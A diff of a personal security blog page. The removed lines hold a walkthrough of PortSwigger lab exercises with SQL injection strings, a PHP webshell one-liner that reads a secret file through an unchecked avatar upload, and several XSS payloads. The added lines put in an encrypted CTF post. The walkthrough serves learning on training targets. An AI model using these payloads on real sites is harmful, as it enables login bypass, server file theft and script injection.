@@ -9,7 +9,7 @@
   
   <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_4k4bc36ef96';window.REIMU_CONFIG.clipboard_tips = {"success":{"en":"Copy successfully (*^▽^*)"},"fail":{"en":"Copy failed (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = 'All articles on this blog are licensed under the BY-NC-SA license agreement unless otherwise stated. Please indicate the source when reprinting!';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://cl1ck-t0.github.io';</script>
   <title>
-    burp靶场漏洞实战 | Cl1ck-t0&#39;s blog
+    ctfshow菜狗杯 | Cl1ck-t0&#39;s blog
   </title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media='all'">
@@ -17,17 +17,16 @@
     
 <link rel="stylesheet" href="/css/loader.css">
 
-    <meta name="description" content="burp靶场漏洞实战wp 之前一直在做各种题库中的题目，偶然得知burp靶场的实验不错，故作次wp，将持续跟进解题进度  一、sql注入  1.实验：WHERE条款中允许检索隐藏数据的SQL注入漏洞 开头一个个看过去，没什么特别的。仔细看发现在Refine your search: 下面点进去url会变为 1https:&#x2F;&#x2F;0ade00b5041780e7808e120800720083.web">
+    <meta name="description" content="前面的区域，以后再来探索吧~">
 <meta property="og:type" content="article">
-<meta property="og:title" content="burp靶场漏洞实战">
-<meta property="og:url" content="https://cl1ck-t0.github.io/2026/03/31/burp%E9%9D%B6%E5%9C%BA%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98/index.html">
+<meta property="og:title" content="ctfshow菜狗杯">
+<meta property="og:url" content="https://cl1ck-t0.github.io/2026/07/15/ctfshow%E8%8F%9C%E7%8B%97%E6%9D%AF/index.html">
 <meta property="og:site_name" content="Cl1ck-t0&#39;s blog">
-<meta property="og:description" content="burp靶场漏洞实战wp 之前一直在做各种题库中的题目，偶然得知burp靶场的实验不错，故作次wp，将持续跟进解题进度  一、sql注入  1.实验：WHERE条款中允许检索隐藏数据的SQL注入漏洞 开头一个个看过去，没什么特别的。仔细看发现在Refine your search: 下面点进去url会变为 1https:&#x2F;&#x2F;0ade00b5041780e7808e120800720083.web">
+<meta property="og:description" content="前面的区域，以后再来探索吧~">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2026-03-31T14:06:57.000Z">
-<meta property="article:modified_time" content="2026-04-19T08:55:26.009Z">
+<meta property="article:published_time" content="2026-07-15T07:51:37.000Z">
+<meta property="article:modified_time" content="2026-07-18T02:54:53.221Z">
 <meta property="article:author" content="Cl1ck-t0">
-<meta property="article:tag" content="burp靶场">
 <meta property="article:tag" content="web">
 <meta name="twitter:card" content="summary">
     <link rel="alternate" href="/atom.xml" title="Cl1ck-t0's blog" type="application/atom+xml">
@@ -122,11 +121,11 @@
 <header id="header" aria-label="Site header">
         <picture>
         </picture>
-          <img  fetchpriority="high" src="/images/banner.webp" alt="burp靶场漏洞实战">
+          <img  fetchpriority="high" src="/images/banner.webp" alt="ctfshow菜狗杯">
   <div id="header-outer">
     <div id="header-title">
           <span id="logo">
-            <h1 data-aos="slide-up">burp靶场漏洞实战</h1>
+            <h1 data-aos="slide-up">ctfshow菜狗杯</h1>
           </span>
         <h2 id="subtitle-wrap" data-aos="slide-down">
         </h2>
@@ -156,8 +155,8 @@
   <div class="sidebar-wrapper">
     <div class="sidebar-wrap" data-aos="fade-up">
           <div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
-<div class="sidebar-toc-wrapper toc-div-class" >
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#burp%E9%9D%B6%E5%9C%BA%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98wp"><span class="toc-number">1.</span> <span class="toc-text"> burp靶场漏洞实战wp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80-sql%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.</span> <span class="toc-text"> 一、sql注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E5%AE%9E%E9%AA%8Cwhere%E6%9D%A1%E6%AC%BE%E4%B8%AD%E5%85%81%E8%AE%B8%E6%A3%80%E7%B4%A2%E9%9A%90%E8%97%8F%E6%95%B0%E6%8D%AE%E7%9A%84sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.1.1.</span> <span class="toc-text"> 1.实验：WHERE条款中允许检索隐藏数据的SQL注入漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E5%AE%9E%E9%AA%8C%E5%85%81%E8%AE%B8%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E7%9A%84sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.1.2.</span> <span class="toc-text"> 2.实验：允许登录绕过的SQL注入漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E5%AE%9E%E9%AA%8Csql%E6%B3%A8%E5%85%A5union%E6%94%BB%E5%87%BB%E7%A1%AE%E5%AE%9A%E6%9F%A5%E8%AF%A2%E8%BF%94%E5%9B%9E%E7%9A%84%E5%88%97%E6%95%B0"><span class="toc-number">1.1.3.</span> <span class="toc-text"> 3.实验：SQL注入UNION攻击，确定查询返回的列数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.2.</span> <span class="toc-text"> 二、文件上传漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E5%AE%9E%E9%AA%8C%E5%AE%A4%E9%80%9A%E8%BF%87%E7%BD%91%E9%A1%B5%E5%A3%B3%E4%B8%8A%E4%BC%A0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">1.2.1.</span> <span class="toc-text"> 1.实验室：通过网页壳上传远程代码执行</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89-%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC"><span class="toc-number">1.3.</span> <span class="toc-text"> 三、跨站脚本</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E5%AE%9E%E9%AA%8C%E5%B0%86xss%E6%98%A0%E5%B0%84%E5%88%B0html%E4%B8%8A%E4%B8%8B%E6%96%87%E4%B8%AD%E4%B8%94%E6%B2%A1%E6%9C%89%E7%BC%96%E7%A0%81"><span class="toc-number">1.3.1.</span> <span class="toc-text"> 1.实验：将XSS映射到HTML上下文中，且没有编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2dom-xss-%E5%9C%A8-sack-%E4%B8%AD%E4%BD%BF%E7%94%A8%E6%BA%90%E4%BB%A3%E7%A0%81documentwritelocationsearch"><span class="toc-number">1.3.2.</span> <span class="toc-text"> 2.DOM XSS 在 sack 中使用源代码document.write&#96;&#96;location.search</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3dom-xss-in-innerhtml-sink-using-source-locationsearch"><span class="toc-number">1.3.3.</span> <span class="toc-text"> 3.DOM XSS in innerHTML sink using source location.search</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E5%AE%9E%E9%AA%8Cjquery-%E9%94%9A%E5%B1%9E%E6%80%A7%E6%B1%87%E5%85%A5-dom-xss-%E4%BD%BF%E7%94%A8%E6%BA%90%E4%BB%A3%E7%A0%81hreflocationsearch"><span class="toc-number">1.3.4.</span> <span class="toc-text"> 4.实验：jQuery 锚属性汇入 DOM XSS 使用源代码href&#96;&#96;location.search</span></a></li></ol></li></ol></li></ol>
+<div class="sidebar-toc-wrapper toc-div-class" style="display: none" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ctfshow%E8%8F%9C%E7%8B%97%E6%9D%AF"><span class="toc-number">1.</span> <span class="toc-text"> ctfshow菜狗杯</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80-%E6%8A%BD%E8%80%81%E5%A9%86"><span class="toc-number">1.1.</span> <span class="toc-text"> 一、抽老婆</span></a></li></ol></li></ol>
 </div>
 </div>
           <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
@@ -218,13 +217,13 @@
   </div>
 </aside>
 
-          <section id="main" aria-label="Main content"><article id="post-burp靶场漏洞实战" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+          <section id="main" aria-label="Main content"><article id="post-ctfshow菜狗杯" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-inner" data-aos="fade-up">
     <div class="article-meta">
       <div class="article-date">
   <span class="article-date-link icon-calendar" data-aos="zoom-in">
-    <time datetime="2026-03-31T14:06:57.000Z" itemprop="datePublished">2026-03-31</time>
-    <time style="display: none;" id="post-update-time">2026-04-19</time>
+    <time datetime="2026-07-15T07:51:37.000Z" itemprop="datePublished">2026-07-15</time>
+    <time style="display: none;" id="post-update-time">2026-07-18</time>
   </span>
 </div>
 
@@ -233,102 +232,39 @@
     <div class="hr-line"></div>
     
     <div class="e-content article-entry" itemprop="articleBody">
-        <h1 id="burp靶场漏洞实战wp"><a class="markdownIt-Anchor" href="#burp靶场漏洞实战wp"></a> burp靶场漏洞实战wp</h1>
-<p>之前一直在做各种题库中的题目，偶然得知burp靶场的实验不错，故作次wp，将持续跟进解题进度</p>
-<h2 id="一-sql注入"><a class="markdownIt-Anchor" href="#一-sql注入"></a> 一、sql注入</h2>
-<h3 id="1实验where条款中允许检索隐藏数据的sql注入漏洞"><a class="markdownIt-Anchor" href="#1实验where条款中允许检索隐藏数据的sql注入漏洞"></a> 1.实验：WHERE条款中允许检索隐藏数据的SQL注入漏洞</h3>
-<p>开头一个个看过去，没什么特别的。仔细看发现在<strong>Refine your search:</strong></p>
-<p>下面点进去url会变为</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://0ade00b5041780e7808e120800720083.web-security-academy.net/filter?category=Tech+gifts</span><br></pre></td></tr></table></figure>
-<p>看起来存在SQL注入。</p>
-<p>改成</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://0ade00b5041780e7808e120800720083.web-security-academy.net/filter?category=1&#x27; or 1=1--+</span><br></pre></td></tr></table></figure>
-<p>直接过了emmmmmm</p>
-<h3 id="2实验允许登录绕过的sql注入漏洞"><a class="markdownIt-Anchor" href="#2实验允许登录绕过的sql注入漏洞"></a> 2.实验：允许登录绕过的SQL注入漏洞</h3>
-<p>题目描述：该实验室的登录功能中存在SQL注入漏洞。</p>
-<p>要解决实验室问题，可以执行SQL注入攻击，以用户身份登录应用。<code>administrator</code></p>
-<p>直接万能语句1’ or 1=1–+ 秒了</p>
-<h3 id="3实验sql注入union攻击确定查询返回的列数"><a class="markdownIt-Anchor" href="#3实验sql注入union攻击确定查询返回的列数"></a> 3.实验：SQL注入UNION攻击，确定查询返回的列数</h3>
-<p>题目看出来是联合注入，</p>
-<p>这里已经很熟悉了，直接非常顺利</p>
-<p>1’ order by 3–+通过</p>
-<p>1’ order by 4–+报错，知道三列</p>
-<p>于是写payload，这里有一个问题当时错了：</p>
-<p>我最开始写的payload是：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://0a9000cf04defb8b808a26d400ac0024.web-security-academy.net/filter?category=-1&#x27; union select 1,2,3--+</span><br></pre></td></tr></table></figure>
-<p>页面报错，当时不知道为什么啊，后来查阅资料才知道：因为 <code>UNION</code> 要求类型兼容。如果第一列是整数，你输入 <code>'1'</code> 可能会报错；而 <code>NULL</code> 可以自适应任何类型。所以这里用1,2,3是错误的QAQ</p>
-<p>修改payload得到：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://0a9000cf04defb8b808a26d400ac0024.web-security-academy.net/filter?category=-1&#x27; union select NULL ,NULL ,NULL--+</span><br></pre></td></tr></table></figure>
-<p>通过</p>
-<h2 id="二-文件上传漏洞"><a class="markdownIt-Anchor" href="#二-文件上传漏洞"></a> 二、文件上传漏洞</h2>
-<h3 id="1实验室通过网页壳上传远程代码执行"><a class="markdownIt-Anchor" href="#1实验室通过网页壳上传远程代码执行"></a> 1.实验室：通过网页壳上传远程代码执行</h3>
-<p>题目描述：</p>
-<p>该实验室包含一个易受攻击的图像上传功能。它不会在用户上传的文件存储到服务器文件系统前进行任何验证。</p>
-<p>要解决实验问题，上传一个基础的PHP网页壳，并用它导出文件内容。请通过实验室横幅中的按钮提交此秘密。<code>/home/carlos/secret</code></p>
-<p>您可以使用以下凭证登录您自己的账户：<code>wiener:peter</code></p>
-<p>ps：骗你的，刚开始我甚至不知道这是题目描述（）</p>
-<p>打开来就开始找上传点，然后在评论区找到了上传头像的位置，出于以往经验，我直接尝试上传，却得到missing parameter，多次尝试无果后我转变方向，发现没有login（），这才知道wiener:peter原来是题目里的（）气笑了说是</p>
-<p>题目提示：如果你能成功上传网页外壳，你实际上就完全控制了服务器。这意味着你可以读写任意文件，窃取敏感数据，甚至利用服务器来针对内部基础设施和网络外其他服务器发动攻击。例如，以下PHP一行代码可用于从服务器文件系统读取任意文件：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo file_get_contents(&#x27;/path/to/target/file&#x27;); ?&gt;</span><br></pre></td></tr></table></figure>
-<p>上传后，发送对该恶意文件的请求将在响应中返回目标文件的内容。</p>
-<p>然后就写一句话木马：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo file_get_contents(&#x27;/home/carlos/secret&#x27;); ?&gt;</span><br></pre></td></tr></table></figure>
-<p>上传成功后，查看上传路径，木马便会自动执行，</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /files/avatars/1.php HTTP/2</span><br></pre></td></tr></table></figure>
-<p>得到目标：</p>
-<p>Rnh4NwyW1Gl2Ko3yWlVT2eFgyKRH9Hcd</p>
-<h2 id="三-跨站脚本"><a class="markdownIt-Anchor" href="#三-跨站脚本"></a> 三、跨站脚本</h2>
-<h3 id="1实验将xss映射到html上下文中且没有编码"><a class="markdownIt-Anchor" href="#1实验将xss映射到html上下文中且没有编码"></a> 1.实验：将XSS映射到HTML上下文中，且没有编码</h3>
-<p>最简单的xss，</p>
-<p>直接<code>&lt;script&gt;alert()&lt;/script&gt;</code>就行。</p>
-<h3 id="2dom-xss-在-sack-中使用源代码documentwritelocationsearch"><a class="markdownIt-Anchor" href="#2dom-xss-在-sack-中使用源代码documentwritelocationsearch"></a> 2.DOM XSS 在 sack 中使用源代码<code>document.write``location.search</code></h3>
-<p>理解DOM漏洞原理</p>
-<ul>
-<li><strong>源 (Source)</strong>：<code>location.search</code>，这是浏览器地址栏中 <code>?</code> 后面的部分（也就是 GET 参数）。攻击者可以完全控制这部分。</li>
-<li><strong>汇 (Sink)</strong>：<code>document.write</code>。这个函数会将传入的字符串直接解析为 HTML 写入页面。如果传入的数据包含 <code>&lt;script&gt;</code> 标签，它<strong>通常不会执行</strong>（这是很多人的误区）。</li>
-<li><strong>关键点</strong>：在 <code>document.write</code> 的上下文中，最可靠的 XSS 触发方式不是 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，而是<strong>HTML 事件处理器</strong>，例如 <code>&lt;img src=x onerror=alert(1)&gt;</code>。</li>
-</ul>
-<p>DOM型xss最常见的来源是url,故我们可以尝试一下，在搜索栏里随便输入发现url变成</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://0a360098047f989f80da125100e00067.web-security-academy.net/?search=1</span><br></pre></td></tr></table></figure>
-<p>payload如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;img src=x onerror=alert(666)&gt;</span><br><span class="line">这里注意闭合前面的&lt;&quot;</span><br><span class="line">&quot;&gt;&lt;svg onload=alert(666)&gt;</span><br></pre></td></tr></table></figure>
-<p>其实本实验的核心还是在于闭合前面语句上面。</p>
-<h3 id="3dom-xss-in-innerhtml-sink-using-source-locationsearch"><a class="markdownIt-Anchor" href="#3dom-xss-in-innerhtml-sink-using-source-locationsearch"></a> 3.DOM XSS in <code>innerHTML</code> sink using source <code>location.search</code></h3>
-<p>比2还简单,直接</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=alert()&gt;</span><br></pre></td></tr></table></figure>
-<p>即可。</p>
-<p>这里简单说说原理，</p>
-<ul>
-<li><strong><code>&lt;img</code></strong>：这是一个标准的 HTML 图片标签的开始。浏览器看到它，就会准备去加载一张图片。</li>
-<li><strong><code>src=x</code></strong>：这是图片的源地址属性。我们故意给它一个<strong>不存在的、无效的</strong>地址 <code>x</code>。</li>
-<li><strong><code>onerror=alert(1)</code></strong>：这是一个<strong>事件处理器</strong>。<code>onerror</code> 是 <code>&lt;img&gt;</code> 标签的一个内置事件，它的触发条件是：<strong>当浏览器加载 <code>src</code> 指定的图片资源失败时</strong>。</li>
-</ul>
-<p>因此会触发xss</p>
-<h3 id="4实验jquery-锚属性汇入-dom-xss-使用源代码hreflocationsearch"><a class="markdownIt-Anchor" href="#4实验jquery-锚属性汇入-dom-xss-使用源代码hreflocationsearch"></a> 4.实验：jQuery 锚属性汇入 DOM XSS 使用源代码<code>href``location.search</code></h3>
-<p>本实验室在提交反馈页面中包含一个基于DOM的跨站脚本漏洞。它使用 jQuery 库的选择函数来寻找锚点元素，并利用 的数据更改其属性。<code>$``href``location.search</code></p>
-<p>要解决这个实验，可以设置“回溯”链接提醒。<code>document.cookie</code></p>
-
+        <div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="❌ 密码错误，请重试" data-whm="❌ 文章校验失败">
+  <script id="hbeData" type="hbeData" data-hmacdigest="b25730f916fb5787700d47b72c93560f31477c856f49459e9c03fe91f8de251a">f966b146caa1d415609f44642f4e58196f1418e3b7963be21f4d1c354da83a7b7689071526c5ea403488143267d49ff10fab16f3558082b89a4a919c0323a291159ad327e27df076d46f8ba971fc4298692f8a71317ac0d33efdcb3f50b820f2b157c533142697282390dc414b9c60ef6e8b0f8d167d2b2bb09a80dc5cfa3f42aa2f9a6b7691cbf3d521ffc9e4238813c239230858ac8b6e0cbffe88edb5ef17f91e38fd0a900bb09b271b17d8067877d6d16982516b76011db79e2c3052a0c1a7ebb42d30ee21b2828933a4a4f214827e925a8c676755bf38c47f4217bca75afa984e099347ef4bbfe21368f6e8840ad8b5ba48b60ec2bec7845c95d7445d8e23cf2dd473091a70a5742ce615469d37753a6cda4446a097854b61a5b7dedbf78361d01529825c297355f772d3c05cef51f0004c033e268df76fd717cceac23d5cef6b34b67cfebdf47e724723e25d1da1ec2f570574b59a6d648103d6edbc56c582796f79655b75a8161ee4185dce8b3bb62099600ad554dffccc433a60bca6e8b758a37df93c383c3f508c8fd08fe7726f8904a00500c616ac4a8539d6f2e73d53696c39d2d503f26c9ba8b8b1f3f0e917cb82fa552666d78dcbd081d584bf06ebde398c70e7df35eb32a926ca719c2e6ad9da4a77bea484b74a59e6c3426e1e4129ee5e0c940af6f31b929a16307cbc9e6314223bc15262dd6e218048efce0eb0506d1cba7da05ca71682fd17a4ffe8c09f31a800f9430d3041d2128801b7ecae73db23c9248cbf7e672cf224535b529b07f4f3a6025591eb70e5e8c5dfeccaf4c19cf7f3610a93035638e3761d40be48a3f6e6187c5dc134d803fe0c708b4e202dcaa0f842f73b30793e2ea0609211450271fc6ef22044df1d23568bf38c41819518a2bd3360f517bf80e2fbd50b2f0cf5f07dedcb64eba409326149b4edab7cecbcb0ec7b539e552dd693a259ec83d79762b747d16c9c01aecf6584208d44630fc7b197bfba6d030a096776a266314ff29a6ab721db19cbf92c14f05d24bd293e1930a0b9b87eaa4a176c6f10f86f9b3fd5b0e01415b27b3d0f8dfda0019991c8e79cc1b2eaab2a3d571d75d6fc79a199e58bbcbc56c6b0143cf75cec3960d5f5c0b6cfda8401d9e54eae8360dd6a8e337956e5891f1a4a2992e6e7aaf4f8133af6f34ee34c806fba3e3c636cae40b0b95d00119bb813fb35e3a99b568624d6efeafd84c50d8515d4ab951c0509b7ad88455c25aaaa45236ff5f5bd55eba8108d7555cdb0c0f9416f76dedeb16dc8c0184ada5be69204fdd0865c0e276118811c9ee5aa931b65ac7008aaf42813eeb71fb33da1a6cdac6ca44b4bee89762884815fd4bbc041e1580937c64aa3cb169b6db2bf25c9746c2c1450de039783cdf41c381e0a270b08722234245cd7814ab4248b07d0217b85f6afeb575bbf1686e116c906a75106b231fc38e9692590b0ce36807c1d163ac20fe49f94c113b3cf0e9ed77f994a859aae4fc115b4a7c84e58cbaea52330a674991325c1dfca458d1ab820d2d58e6b301ea3467c49f611808630f0d6f531951fbaf34e28b89124d4e44f900523dce88fb3ab55e80bfe1a8a9de36acb2336e762c8ceaaaad103e548f6ac986679021b9330e20ef5dcd324a8f5506ef99a0b80463c86285abcf215b9cebbd678388ed2ff3edcc60f497dd68359dc1a9f9cdeb1bb020aa68d83e62bb5a18b616b35ad7a2a4a5b80995fb405d2369298fd8a6857fe69cc05407b83fd9b692237e6dab4d3ac9cbee7bd5139212ed700af634a2e5d0af23c9859e4d8d3d8643243e7474d3418306149ba55060d78fb9bcd21e6d21b1b6b963d5e27ede2d8ebe632829a497d1fe81aaff7280aa3788460578a5946c9ad41a119343c473cb3bad95e7b92dc0116420c49fbfb6fcec3c1ff53105a826d646699707ac02a7baa72f0f4ae6f64d831e7dabc492dd29068901acc2255d832f3cd3e83ea14eed261a4e0de52b41f05c538f06841f5e4c9e4712241980b0c32e4ec12cf2b565096c7a649b58e66077b224d33a604a23005152a8a75d9486076c8cf1829e6f915fb789a036e7301d3d2e0dfd2b4487d561d96510ffae85a62a300d9737e2ac548aeadec6d63bacd77b838c3261de8a052fa934d82ff55b4bce492b3fea467cc1a5fd7724e920668c25dfba647877584a3286424412386f1b3b1f6f96774540a0b702f5f297b2ac814105288bb67cf216afdcb7fc1ecfd9a127701b4639bef484af3de1aa3ece023bf1983e61c86eab45c5cf3f3032c1ff1fd27d49b29408e5663cd2bc97f505a46ff6bc0a0ecec28a9a69f7f564aa7b882253853ff534b41eea4f2eda4b01954663483e299cf52c271529618399293c9fc299edaf94bf0a308ad0899ff7b8cdcb9d22dff533e5e3caf7bf3d105f292103b7ae1468251a4703a481e41013ac4d370adf2f2d8cf1666234f82298a40b5044dfcf6e110a5136b7820926e08a774d0d31eebed4ea267a7fa70947465dd47a0aa9ac8b2c5513e9568bc4d17896885aef7215ad7f812e31e65ab020d14b41e24fd5a252180830a9eedc9e120df604a0aafd6acb0c7ec4856f86fb29a95b86e54ec158fb941996254b26377dcefe26606b2af14223dba5e66d2cbb0feca75ba811bd5a4d2c1112b41aea6f5a91732325f06e1dfa13dcc2ed1de5c97da7d6b007ff170fbfc5b7b0aae4da5d9bab644a92bd1ce388f6c22739cd74f8a350883b09ca4c006bec0be1fce7f49dbda834cc43b2115bdcd44d55effbd5f3ef26b9696cc0c2209955e3d834375ae505cffeac3df4f002d3afa32d8b02a384e99b088f6bd1d939f55a69d8e4a3da19ada032118729ff4ac158a1670ef21f7ba803a3688dc01e559f0674206e1fa66a362ce89336ed4c3cc1a4a143aa9243ce0</script>
+  <div class="hbe hbe-content">
+    <div class="hbe hbe-input hbe-input-default">
+      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
+      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
+        <span class="hbe hbe-input-label-content hbe-input-label-content-default">不给看~</span>
+      </label>
+    </div>
+  </div>
+</div>
+<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">
     </div>
     <footer class="article-footer">
         <blockquote class="article-copyright">
     <p><strong><span class="icon-user icon"></span>Author: </strong>Cl1ck-t0</p>
-    <p><strong><span class="icon-link icon"></span>Permalink: </strong><a href="https://cl1ck-t0.github.io/2026/03/31/burp%E9%9D%B6%E5%9C%BA%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98/">https://cl1ck-t0.github.io/2026/03/31/burp%E9%9D%B6%E5%9C%BA%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98/</a></p>
+    <p><strong><span class="icon-link icon"></span>Permalink: </strong><a href="https://cl1ck-t0.github.io/2026/07/15/ctfshow%E8%8F%9C%E7%8B%97%E6%9D%AF/">https://cl1ck-t0.github.io/2026/07/15/ctfshow%E8%8F%9C%E7%8B%97%E6%9D%AF/</a></p>
     
-    <p><strong><span class="icon-calendar icon"></span>Published: </strong>2026-03-31 22:06:57</p>
-    <p><strong><span class="icon-calendar icon"></span>Updated: </strong>2026-04-19 16:55:26</p>
+    <p><strong><span class="icon-calendar icon"></span>Published: </strong>2026-07-15 15:51:37</p>
+    <p><strong><span class="icon-calendar icon"></span>Updated: </strong>2026-07-18 10:54:53</p>
     <p><strong><span class="icon-copyright icon"></span>License: </strong>All articles on this blog are licensed under the <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener nofollow noreferrer" target="_blank"><span class="icon-creative-commons"></span>BY-NC-SA</a> license agreement unless otherwise stated. Please indicate the source when reprinting!</p>
     <span class="icon-creative-commons article-copyright-bg"></span>
   </blockquote>
         <div class="share-wrapper">
-    <a href="https://service.weibo.com/share/share.php?url=https%3A%2F%2Fcl1ck-t0.github.io%2F2026%2F03%2F31%2Fburp%25E9%259D%25B6%25E5%259C%25BA%25E6%25BC%258F%25E6%25B4%259E%25E5%25AE%259E%25E6%2588%2598%2F&amp;appkey=&amp;title=burp%E9%9D%B6%E5%9C%BA%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98&amp;pic=&amp;ralateUid=" target="_blank" rel="noopener noreferrer" title="burp靶场漏洞实战">
+    <a href="https://service.weibo.com/share/share.php?url=https%3A%2F%2Fcl1ck-t0.github.io%2F2026%2F07%2F15%2Fctfshow%25E8%258F%259C%25E7%258B%2597%25E6%259D%25AF%2F&amp;appkey=&amp;title=ctfshow%E8%8F%9C%E7%8B%97%E6%9D%AF&amp;pic=&amp;ralateUid=" target="_blank" rel="noopener noreferrer" title="ctfshow菜狗杯">
       <div class="share-icon icon icon-weibo">
       </div>
     </a>
-    <a href="https://connect.qq.com/widget/shareqq/index.html?url=www.baidu.com&amp;title=burp%E9%9D%B6%E5%9C%BA%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98&amp;desc=burp%E9%9D%B6%E5%9C%BA%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98&amp;source=https%3A%2F%2Fcl1ck-t0.github.io" target="_blank" rel="noopener noreferrer" title="burp靶场漏洞实战">
+    <a href="https://connect.qq.com/widget/shareqq/index.html?url=www.baidu.com&amp;title=ctfshow%E8%8F%9C%E7%8B%97%E6%9D%AF&amp;desc=%E5%89%8D%E9%9D%A2%E7%9A%84%E5%8C%BA%E5%9F%9F%EF%BC%8C%E4%BB%A5%E5%90%8E%E5%86%8D%E6%9D%A5%E6%8E%A2%E7%B4%A2%E5%90%A7~&amp;source=https%3A%2F%2Fcl1ck-t0.github.io" target="_blank" rel="noopener noreferrer" title="ctfshow菜狗杯">
       <div class="share-icon icon icon-qq">
       </div>
     </a>
-    <a href="javascript:;"  title="burp靶场漏洞实战">
+    <a href="javascript:;"  title="ctfshow菜狗杯">
       <div class="share-icon icon icon-weixin">
           <div id="share-weixin">
             <div class="share-weixin-dom">
@@ -351,25 +287,25 @@
     </a>
 </div>
       
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/burp%E9%9D%B6%E5%9C%BA/" rel="tag" title="burp靶场">burp靶场</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/web/" rel="tag" title="web">web</a></li></ul>
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/web/" rel="tag" title="web">web</a></li></ul>
 
     </footer>
   </div>
     <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
       <div class="article-nav-link-wrap left">
-            <img data-src="/covers/809f64502bdf5b512370ef935ce818b7.jpg" data-sizes="auto" alt="ACTF2025" class="lazyload">
-        <a href="/2026/07/14/ACTF2025/" aria-label="Prev: ACTF2025" title="Prev: ACTF2025"></a>
+            <img data-src="/covers/pd-image (2).png" data-sizes="auto" alt="新生赛赛后总结" class="lazyload">
